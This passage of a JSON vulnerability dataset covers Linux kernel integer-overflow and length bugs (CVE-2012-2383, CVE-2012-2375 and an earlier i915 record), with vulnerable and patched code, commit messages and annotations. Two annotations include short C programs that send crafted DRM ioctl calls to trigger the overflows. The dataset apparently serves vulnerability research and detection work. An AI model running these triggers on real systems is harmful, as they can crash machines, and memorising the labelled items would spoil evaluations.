(0x40000000)\n- Set up fake cliprects buffer\n- Trigger overflow via IOCTL call\n- Observe crash or attempt privilege escalation\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/ioctl.h>\n#include <drm/i915_drm.h>\n\nint main() {\n    int fd = open(\"/dev/dri/card0\", O_RDWR);\n    struct drm_i915_gem_execbuffer2 args = {0};\n    \n    args.num_cliprects = 0x40000000; // Trigger overflow\n    args.cliprects_ptr = (__u64)0xdeadbeef; // Any buffer would do\n    \n    ioctl(fd, DRM_IOCTL_I915_GEM_EXECBUFFER2, &args);\n    close(fd);\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nif (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {\n    DRM_DEBUG(\"execbuf with %u cliprects\\n\",\n              args->num_cliprects);\n    return -EINVAL;\n}\ncliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n                    GFP_KERNEL);\n```\n\n[Mandatory] Fix summary:\nAdded bounds check to prevent integer overflow when calculating cliprects buffer size.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/44afb3a04391a74309d16180d1e4f8386fdfa745\n\n[Optional] Patch Analysis:\nField: PatchType: Integer overflow check added\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Audit other cliprects-related calculations in DRM subsystem\n- Check similar buffer allocations in graphics-related system calls\n\n[Optional] Likely variants/impact (one line):\nSimilar integer overflows could exist in other buffer size calculations.",
        "tests": "NA",
        "solutions": "i915_gem_do_execbuffer(struct drm_device *dev, void *data,\n\t\t       struct drm_file *file,\n\t\t       struct drm_i915_gem_execbuffer2 *args,\n\t\t       struct drm_i915_gem_exec_object2 *exec)\n{\n\tdrm_i915_private_t *dev_priv = dev->dev_private;\n\tstruct list_head objects;\n\tstruct eb_objects *eb;\n\tstruct drm_i915_gem_object *batch_obj;\n\tstruct drm_clip_rect *cliprects = NULL;\n\tstruct intel_ring_buffer *ring;\n\tu32 exec_start, exec_len;\n\tu32 seqno;\n\tu32 mask;\n\tint ret, mode, i;\n\n\tif (!i915_gem_check_execbuffer(args)) {\n\t\tDRM_DEBUG(\"execbuf with invalid offset/length\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\tret = validate_exec_list(exec, args->buffer_count);\n\tif (ret)\n\t\treturn ret;\n\n\tswitch (args->flags & I915_EXEC_RING_MASK) {\n\tcase I915_EXEC_DEFAULT:\n\tcase I915_EXEC_RENDER:\n\t\tring = &dev_priv->ring[RCS];\n\t\tbreak;\n\tcase I915_EXEC_BSD:\n\t\tif (!HAS_BSD(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BSD)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[VCS];\n\t\tbreak;\n\tcase I915_EXEC_BLT:\n\t\tif (!HAS_BLT(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BLT)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[BCS];\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown ring: %d\\n\",\n\t\t\t  (int)(args->flags & I915_EXEC_RING_MASK));\n\t\treturn -EINVAL;\n\t}\n\n\tmode = args->flags & I915_EXEC_CONSTANTS_MASK;\n\tmask = I915_EXEC_CONSTANTS_MASK;\n\tswitch (mode) {\n\tcase I915_EXEC_CONSTANTS_REL_GENERAL:\n\tcase I915_EXEC_CONSTANTS_ABSOLUTE:\n\tcase I915_EXEC_CONSTANTS_REL_SURFACE:\n\t\tif (ring == &dev_priv->ring[RCS] &&\n\t\t    mode != dev_priv->relative_constants_mode) {\n\t\t\tif (INTEL_INFO(dev)->gen < 4)\n\t\t\t\treturn -EINVAL;\n\n\t\t\tif (INTEL_INFO(dev)->gen > 5 &&\n\t\t\t    mode == I915_EXEC_CONSTANTS_REL_SURFACE)\n\t\t\t\treturn -EINVAL;\n\n\t\t\t/* The HW changed the meaning on this bit on gen6 */\n\t\t\tif (INTEL_INFO(dev)->gen >= 6)\n\t\t\t\tmask &= ~I915_EXEC_CONSTANTS_REL_SURFACE;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown constants: %d\\n\", mode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->buffer_count < 1) {\n\t\tDRM_DEBUG(\"execbuf with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->num_cliprects != 0) {\n\t\tif (ring != &dev_priv->ring[RCS]) {\n\t\t\tDRM_DEBUG(\"clip rectangles are only valid with the render ring\\n\");\n \t\t\treturn -EINVAL;\n \t\t}\n \n\t\tif (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {\n\t\t\tDRM_DEBUG(\"execbuf with %u cliprects\\n\",\n\t\t\t\t  args->num_cliprects);\n\t\t\treturn -EINVAL;\n\t\t}\n \t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n \t\t\t\t    GFP_KERNEL);\n \t\tif (cliprects == NULL) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\n\t\tif (copy_from_user(cliprects,\n\t\t\t\t     (struct drm_clip_rect __user *)(uintptr_t)\n\t\t\t\t     args->cliprects_ptr,\n\t\t\t\t     sizeof(*cliprects)*args->num_cliprects)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\t}\n\n\tret = i915_mutex_lock_interruptible(dev);\n\tif (ret)\n\t\tgoto pre_mutex_err;\n\n\tif (dev_priv->mm.suspended) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -EBUSY;\n\t\tgoto pre_mutex_err;\n\t}\n\n\teb = eb_create(args->buffer_count);\n\tif (eb == NULL) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -ENOMEM;\n\t\tgoto pre_mutex_err;\n\t}\n\n\t/* Look up object handles */\n\tINIT_LIST_HEAD(&objects);\n\tfor (i = 0; i < args->buffer_count; i++) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = to_intel_bo(drm_gem_object_lookup(dev, file,\n\t\t\t\t\t\t\texec[i].handle));\n\t\tif (&obj->base == NULL) {\n\t\t\tDRM_DEBUG(\"Invalid object handle %d at index %d\\n\",\n\t\t\t\t   exec[i].handle, i);\n\t\t\t/* prevent error path from reading uninitialized data */\n\t\t\tret = -ENOENT;\n\t\t\tgoto err;\n\t\t}\n\n\t\tif (!list_empty(&obj->exec_list)) {\n\t\t\tDRM_DEBUG(\"Object %p [handle %d, index %d] appears more than once in object list\\n\",\n\t\t\t\t   obj, exec[i].handle, i);\n\t\t\tret = -EINVAL;\n\t\t\tgoto err;\n\t\t}\n\n\t\tlist_add_tail(&obj->exec_list, &objects);\n\t\tobj->exec_handle = exec[i].handle;\n\t\tobj->exec_entry = &exec[i];\n\t\teb_add_object(eb, obj);\n\t}\n\n\t/* take note of the batch buffer before we might reorder the lists */\n\tbatch_obj = list_entry(objects.prev,\n\t\t\t       struct drm_i915_gem_object,\n\t\t\t       exec_list);\n\n\t/* Move the objects en-masse into the GTT, evicting if necessary. */\n\tret = i915_gem_execbuffer_reserve(ring, file, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\t/* The objects are in their final locations, apply the relocations. */\n\tret = i915_gem_execbuffer_relocate(dev, eb, &objects);\n\tif (ret) {\n\t\tif (ret == -EFAULT) {\n\t\t\tret = i915_gem_execbuffer_relocate_slow(dev, file, ring,\n\t\t\t\t\t\t\t\t&objects, eb,\n\t\t\t\t\t\t\t\texec,\n\t\t\t\t\t\t\t\targs->buffer_count);\n\t\t\tBUG_ON(!mutex_is_locked(&dev->struct_mutex));\n\t\t}\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\t/* Set the pending read domains for the batch buffer to COMMAND */\n\tif (batch_obj->base.pending_write_domain) {\n\t\tDRM_DEBUG(\"Attempting to use self-modifying batch buffer\\n\");\n\t\tret = -EINVAL;\n\t\tgoto err;\n\t}\n\tbatch_obj->base.pending_read_domains |= I915_GEM_DOMAIN_COMMAND;\n\n\tret = i915_gem_execbuffer_move_to_gpu(ring, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\tseqno = i915_gem_next_request_seqno(ring);\n\tfor (i = 0; i < ARRAY_SIZE(ring->sync_seqno); i++) {\n\t\tif (seqno < ring->sync_seqno[i]) {\n\t\t\t/* The GPU can not handle its semaphore value wrapping,\n\t\t\t * so every billion or so execbuffers, we need to stall\n\t\t\t * the GPU in order to reset the counters.\n\t\t\t */\n\t\t\tret = i915_gpu_idle(dev, true);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tBUG_ON(ring->sync_seqno[i]);\n\t\t}\n\t}\n\n\tif (ring == &dev_priv->ring[RCS] &&\n\t    mode != dev_priv->relative_constants_mode) {\n\t\tret = intel_ring_begin(ring, 4);\n\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\tintel_ring_emit(ring, MI_NOOP);\n\t\tintel_ring_emit(ring, MI_LOAD_REGISTER_IMM(1));\n\t\tintel_ring_emit(ring, INSTPM);\n\t\tintel_ring_emit(ring, mask << 16 | mode);\n\t\tintel_ring_advance(ring);\n\n\t\tdev_priv->relative_constants_mode = mode;\n\t}\n\n\tif (args->flags & I915_EXEC_GEN7_SOL_RESET) {\n\t\tret = i915_reset_gen7_sol_offsets(dev, ring);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ttrace_i915_gem_ring_dispatch(ring, seqno);\n\n\texec_start = batch_obj->gtt_offset + args->batch_start_offset;\n\texec_len = args->batch_len;\n\tif (cliprects) {\n\t\tfor (i = 0; i < args->num_cliprects; i++) {\n\t\t\tret = i915_emit_box(dev, &cliprects[i],\n\t\t\t\t\t    args->DR1, args->DR4);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tret = ring->dispatch_execbuffer(ring,\n\t\t\t\t\t\t\texec_start, exec_len);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\t\t}\n\t} else {\n\t\tret = ring->dispatch_execbuffer(ring, exec_start, exec_len);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ti915_gem_execbuffer_move_to_active(&objects, ring, seqno);\n\ti915_gem_execbuffer_retire_commands(dev, file, ring);\n\nerr:\n\teb_destroy(eb);\n\twhile (!list_empty(&objects)) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = list_first_entry(&objects,\n\t\t\t\t       struct drm_i915_gem_object,\n\t\t\t\t       exec_list);\n\t\tlist_del_init(&obj->exec_list);\n\t\tdrm_gem_object_unreference(&obj->base);\n\t}\n\n\tmutex_unlock(&dev->struct_mutex);\n\npre_mutex_err:\n\tkfree(cliprects);\n\treturn ret;\n}\n",
        "Publish Date": "2012-06-13",
        "Update Date": "2016-08-22",
        "Vulnerability type": "DoS Overflow ",
        "commit_url": "https://github.com/torvalds/linux/commit/44afb3a04391a74309d16180d1e4f8386fdfa745",
        "commit_id": "44afb3a04391a74309d16180d1e4f8386fdfa745",
        "commit_message": "drm/i915: fix integer overflow in i915_gem_do_execbuffer()\n\nOn 32-bit systems, a large args->num_cliprects from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 432e58ed (\"drm/i915: Avoid\nallocation for execbuffer object list\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-189",
        "CVE": "CVE-2012-2383",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "drivers/gpu/drm/i915/i915_gem_execbuffer.c": "i915_gem_execbuffer2(struct drm_device *dev, void *data,\n\t\t     struct drm_file *file)\n{\n\tstruct drm_i915_gem_execbuffer2 *args = data;\n \tstruct drm_i915_gem_exec_object2 *exec2_list = NULL;\n \tint ret;\n \n\tif (args->buffer_count < 1) {\n \t\tDRM_DEBUG(\"execbuf2 with %d buffers\\n\", args->buffer_count);\n \t\treturn -EINVAL;\n \t}\n\n\texec2_list = kmalloc(sizeof(*exec2_list)*args->buffer_count,\n\t\t\t     GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (exec2_list == NULL)\n\t\texec2_list = drm_malloc_ab(sizeof(*exec2_list),\n\t\t\t\t\t   args->buffer_count);\n\tif (exec2_list == NULL) {\n\t\tDRM_DEBUG(\"Failed to allocate exec list for %d buffers\\n\",\n\t\t\t  args->buffer_count);\n\t\treturn -ENOMEM;\n\t}\n\tret = copy_from_user(exec2_list,\n\t\t\t     (struct drm_i915_relocation_entry __user *)\n\t\t\t     (uintptr_t) args->buffers_ptr,\n\t\t\t     sizeof(*exec2_list) * args->buffer_count);\n\tif (ret != 0) {\n\t\tDRM_DEBUG(\"copy %d exec entries failed %d\\n\",\n\t\t\t  args->buffer_count, ret);\n\t\tdrm_free_large(exec2_list);\n\t\treturn -EFAULT;\n\t}\n\n\tret = i915_gem_do_execbuffer(dev, data, file, args, exec2_list);\n\tif (!ret) {\n\t\t/* Copy the new buffer offsets back to the user's exec list. */\n\t\tret = copy_to_user((struct drm_i915_relocation_entry __user *)\n\t\t\t\t   (uintptr_t) args->buffers_ptr,\n\t\t\t\t   exec2_list,\n\t\t\t\t   sizeof(*exec2_list) * args->buffer_count);\n\t\tif (ret) {\n\t\t\tret = -EFAULT;\n\t\t\tDRM_DEBUG(\"failed to copy %d exec entries \"\n\t\t\t\t  \"back to user (%d)\\n\",\n\t\t\t\t  args->buffer_count, ret);\n\t\t}\n\t}\n\n\tdrm_free_large(exec2_list);\n\treturn ret;\n}\n"
        },
        "vulnerabilities": "Integer overflow in the i915_gem_execbuffer2 function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2383\n\n[Mandatory] Title: CVE-2012-2383 / CWE-189:\nLinux kernel DRM i915_gem_execbuffer2 integer overflow\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-06-13 \u2014 Patch release: 2016-08-22\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.5 (32-bit platforms)\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-189 Integer Overflow or Wraparound\n[Mandatory] Summary:\nThe vulnerability exists in the i915_gem_execbuffer2 function in the Linux kernel's Direct Rendering Manager (DRM) subsystem. A crafted ioctl call with a large buffer_count value can trigger an integer overflow during buffer allocation, leading to an out-of-bounds write. This affects 32-bit platforms and could result in denial of service or potentially other impacts.\n[Mandatory] Root cause:\nUnchecked integer overflow in buffer_count calculation during memory allocation in i915_gem_execbuffer2.\n[Mandatory] Attack Surface:\nLinux kernel DRM subsystem (graphics driver)\n[Mandatory] Impact Summary:\nPotential denial of service or system compromise\n[Optional] Trigger / Attack vector:\nCrafted ioctl call to DRM subsystem\n[Mandatory] Key code/struct excerpt (minimal):\n```\nif (args->buffer_count < 1) {\n \tDRM_DEBUG(\"execbuf2 with %d buffers\\n\", args->buffer_count);\n \treturn -EINVAL;\n }\nexec2_list = kmalloc(sizeof(*exec2_list)*args->buffer_count,\n\t\t     GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nDRM subsystem ioctl interface\n\n[Mandatory] Exploit primitive(s) available:\nOut-of-bounds write\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal users can trigger the vulnerability through a crafted ioctl call with a large buffer_count value.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Open DRM device file\n- Prepare malicious ioctl parameters\n- Set buffer_count to a value that triggers overflow\n- Call i915_gem_execbuffer2 ioctl\n- Handle potential system instability\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <drm/i915_drm.h>\n\nint main() {\n    int fd = open(\"/dev/dri/card0\", O_RDWR);\n    struct drm_i915_gem_execbuffer2 args;\n    \n    // Set up malicious parameters\n    args.buffer_count = UINT_MAX / sizeof(struct drm_i915_gem_exec_object2) + 1;\n    \n    // Trigger vulnerability\n    ioctl(fd, DRM_IOCTL_I915_GEM_EXECBUFFER2, &args);\n    \n    close(fd);\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```\nif (args->buffer_count < 1 ||\n    args->buffer_count > UINT_MAX / sizeof(*exec2_list)) {\n \tDRM_DEBUG(\"execbuf2 with %d buffers\\n\", args->buffer_count);\n \treturn -EINVAL;\n }\n```\n\n[Mandatory] Fix summary:\nAdded integer overflow check by verifying buffer_count doesn't exceed UINT_MAX / sizeof(element) during allocation.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/ed8cd3b2cd61004cab85380c52b1817aca1ca49b\n\n[Optional] Patch Analysis:\nField: PatchType - bounds check added\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other buffer allocation sites in DRM subsystem\n- Fuzz test all DRM ioctl interfaces\n- Check for similar integer overflows in other kernel subsystems\n\n[Optional] Likely variants/impact (one line):\nSimilar integer overflows in buffer allocation calculations might exist",
        "tests": "NA",
        "solutions": "i915_gem_execbuffer2(struct drm_device *dev, void *data,\n\t\t     struct drm_file *file)\n{\n\tstruct drm_i915_gem_execbuffer2 *args = data;\n \tstruct drm_i915_gem_exec_object2 *exec2_list = NULL;\n \tint ret;\n \n\tif (args->buffer_count < 1 ||\n\t    args->buffer_count > UINT_MAX / sizeof(*exec2_list)) {\n \t\tDRM_DEBUG(\"execbuf2 with %d buffers\\n\", args->buffer_count);\n \t\treturn -EINVAL;\n \t}\n\n\texec2_list = kmalloc(sizeof(*exec2_list)*args->buffer_count,\n\t\t\t     GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (exec2_list == NULL)\n\t\texec2_list = drm_malloc_ab(sizeof(*exec2_list),\n\t\t\t\t\t   args->buffer_count);\n\tif (exec2_list == NULL) {\n\t\tDRM_DEBUG(\"Failed to allocate exec list for %d buffers\\n\",\n\t\t\t  args->buffer_count);\n\t\treturn -ENOMEM;\n\t}\n\tret = copy_from_user(exec2_list,\n\t\t\t     (struct drm_i915_relocation_entry __user *)\n\t\t\t     (uintptr_t) args->buffers_ptr,\n\t\t\t     sizeof(*exec2_list) * args->buffer_count);\n\tif (ret != 0) {\n\t\tDRM_DEBUG(\"copy %d exec entries failed %d\\n\",\n\t\t\t  args->buffer_count, ret);\n\t\tdrm_free_large(exec2_list);\n\t\treturn -EFAULT;\n\t}\n\n\tret = i915_gem_do_execbuffer(dev, data, file, args, exec2_list);\n\tif (!ret) {\n\t\t/* Copy the new buffer offsets back to the user's exec list. */\n\t\tret = copy_to_user((struct drm_i915_relocation_entry __user *)\n\t\t\t\t   (uintptr_t) args->buffers_ptr,\n\t\t\t\t   exec2_list,\n\t\t\t\t   sizeof(*exec2_list) * args->buffer_count);\n\t\tif (ret) {\n\t\t\tret = -EFAULT;\n\t\t\tDRM_DEBUG(\"failed to copy %d exec entries \"\n\t\t\t\t  \"back to user (%d)\\n\",\n\t\t\t\t  args->buffer_count, ret);\n\t\t}\n\t}\n\n\tdrm_free_large(exec2_list);\n\treturn ret;\n}\n",
        "Publish Date": "2012-06-13",
        "Update Date": "2016-08-22",
        "Vulnerability type": "DoS Overflow ",
        "commit_url": "https://github.com/torvalds/linux/commit/ed8cd3b2cd61004cab85380c52b1817aca1ca49b",
        "commit_id": "ed8cd3b2cd61004cab85380c52b1817aca1ca49b",
        "commit_message": "drm/i915: fix integer overflow in i915_gem_execbuffer2()\n\nOn 32-bit systems, a large args->buffer_count from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 8408c282 (\"drm/i915:\nFirst try a normal large kmalloc for the temporary exec buffers\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-189",
        "CVE": "CVE-2012-2375",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "fs/nfs/nfs4proc.c": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tint ret = -ENOMEM, npages, i, acl_len = 0;\n\n\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n\t/* As long as we're doing a round trip to the server anyway,\n\t * let's be prepared for a page of acl data. */\n\tif (npages == 0)\n\t\tnpages = 1;\n\n\tfor (i = 0; i < npages; i++) {\n\t\tpages[i] = alloc_page(GFP_KERNEL);\n\t\tif (!pages[i])\n\t\t\tgoto out_free;\n\t}\n\tif (npages > 1) {\n\t\t/* for decoding across pages */\n\t\tres.acl_scratch = alloc_page(GFP_KERNEL);\n\t\tif (!res.acl_scratch)\n\t\t\tgoto out_free;\n\t}\n\targs.acl_len = npages * PAGE_SIZE;\n\targs.acl_pgbase = 0;\n\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n\t * the page we send as a guess */\n\tif (buf == NULL)\n\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n\tresp_buf = page_address(pages[0]);\n\n\tdprintk(\"%s  buf %p buflen %zu npages %d args.acl_len %zu\\n\",\n\t\t__func__, buf, buflen, npages, args.acl_len);\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\n\tacl_len = res.acl_len - res.acl_data_offset;\n\tif (acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n\t\t\t\t      acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n \t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n \t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n\t\t\t\tres.acl_len);\n \t}\n \tret = acl_len;\n out_free:\n\tfor (i = 0; i < npages; i++)\n\t\tif (pages[i])\n\t\t\t__free_page(pages[i]);\n\tif (res.acl_scratch)\n\t\t__free_page(res.acl_scratch);\n\treturn ret;\n}\n"
        },
        "vulnerabilities": "The __nfs4_get_acl_uncached function in fs/nfs/nfs4proc.c in the NFSv4 implementation in the Linux kernel before 3.3.2 uses an incorrect length variable during a copy operation, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words in an FATTR4_ACL reply.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-4131.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2375\n\n[Mandatory] Title: CVE-2012-2375 / CWE-189:\nNFSv4 ACL length handling vulnerability\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-06-13 \u2014 Patch release: 2016-08-22\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.2\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-189: Numeric Errors (Incorrect Length Calculation)\n\n[Mandatory] Summary:\nThe __nfs4_get_acl_uncached function in the Linux kernel's NFSv4 implementation uses an incorrect length variable during a copy operation when processing FATTR4_ACL replies. A remote NFS server can trigger this flaw by sending an excessive number of bitmap words, causing a kernel OOPS and denial of service. The vulnerability stems from using res.acl_len instead of acl_len when copying data from pages to the user buffer.\n\n[Mandatory] Root cause:\nIncorrect length parameter (res.acl_len instead of acl_len) passed to _copy_from_pages() during buffer copy operation.\n\n[Mandatory] Attack Surface:\nNetwork-attacked NFSv4 service\n\n[Mandatory] Impact Summary:\nRemote denial of service (kernel OOPS)\n\n[Optional] Trigger / Attack vector:\nMalicious FATTR4_ACL reply from NFS server containing excessive bitmap words\n\n[Mandatory] Key code/struct excerpt (minimal):\nif (buf) {\n    ret = -ERANGE;\n    if (acl_len > buflen)\n        goto out_free;\n    _copy_from_pages(buf, pages, res.acl_data_offset,\n            res.acl_len);\n}\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nNFSv4 protocol (FATTR4_ACL reply handling)\n\n[Mandatory] Exploit primitive(s) available:\nKernel memory corruption leading to OOPS\n\n[Mandatory] Exploitability summary (1 sentence):\nRemote exploit requires ability to send specially crafted NFS replies to trigger the incorrect length calculation.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a malicious NFS server that responds to GETACL requests\n- Craft a response with excessive bitmap words in FATTR4_ACL reply\n- Force the client to process the malformed ACL reply\n- Trigger incorrect length calculation during buffer copy\n- Cause kernel OOPS on vulnerable client\n\n[Mandatory] Exploitation Example script payload code:\nNA\n\nFix\n[Mandatory] Fix code:\nif (buf) {\n    ret = -ERANGE;\n    if (acl_len > buflen)\n        goto out_free;\n    _copy_from_pages(buf, pages, res.acl_data_offset,\n            acl_len);\n}\n\n[Mandatory] Fix summary:\nChanged _copy_from_pages() parameter from res.acl_len to acl_len to use the correct length value after adjusting for bitmap size.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/20e0fa98b751facf9a1101edaefbc19c82616a68\n\n[Optional] Patch Analysis:\nField: PatchType (e.g., bounds check added, logic refactor, feature removal)\nCorrected length parameter usage in copy operation\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other NFSv4 ACL handling functions for similar length calculation issues\n- Check related protocol handlers for incorrect parameter passing\n\n[Optional] Likely variants/impact (one line):\nSimilar length handling issues in related protocol handlers",
        "tests": "NA",
        "solutions": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tint ret = -ENOMEM, npages, i, acl_len = 0;\n\n\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n\t/* As long as we're doing a round trip to the server anyway,\n\t * let's be prepared for a page of acl data. */\n\tif (npages == 0)\n\t\tnpages = 1;\n\n\tfor (i = 0; i < npages; i++) {\n\t\tpages[i] = alloc_page(GFP_KERNEL);\n\t\tif (!pages[i])\n\t\t\tgoto out_free;\n\t}\n\tif (npages > 1) {\n\t\t/* for decoding across pages */\n\t\tres.acl_scratch = alloc_page(GFP_KERNEL);\n\t\tif (!res.acl_scratch)\n\t\t\tgoto out_free;\n\t}\n\targs.acl_len = npages * PAGE_SIZE;\n\targs.acl_pgbase = 0;\n\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n\t * the page we send as a guess */\n\tif (buf == NULL)\n\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n\tresp_buf = page_address(pages[0]);\n\n\tdprintk(\"%s  buf %p buflen %zu npages %d args.acl_len %zu\\n\",\n\t\t__func__, buf, buflen, npages, args.acl_len);\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\n\tacl_len = res.acl_len - res.acl_data_offset;\n\tif (acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n\t\t\t\t      acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n \t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n \t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n\t\t\t\tacl_len);\n \t}\n \tret = acl_len;\n out_free:\n\tfor (i = 0; i < npages; i++)\n\t\tif (pages[i])\n\t\t\t__free_page(pages[i]);\n\tif (res.acl_scratch)\n\t\t__free_page(res.acl_scratch);\n\treturn ret;\n}\n",
        "Publish Date": "2012-06-13",
        "Update Date": "2016-08-22",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/20e0fa98b751facf9a1101edaefbc19c82616a68",
        "commit_id": "20e0fa98b751facf9a1101edaefbc19c82616a68",
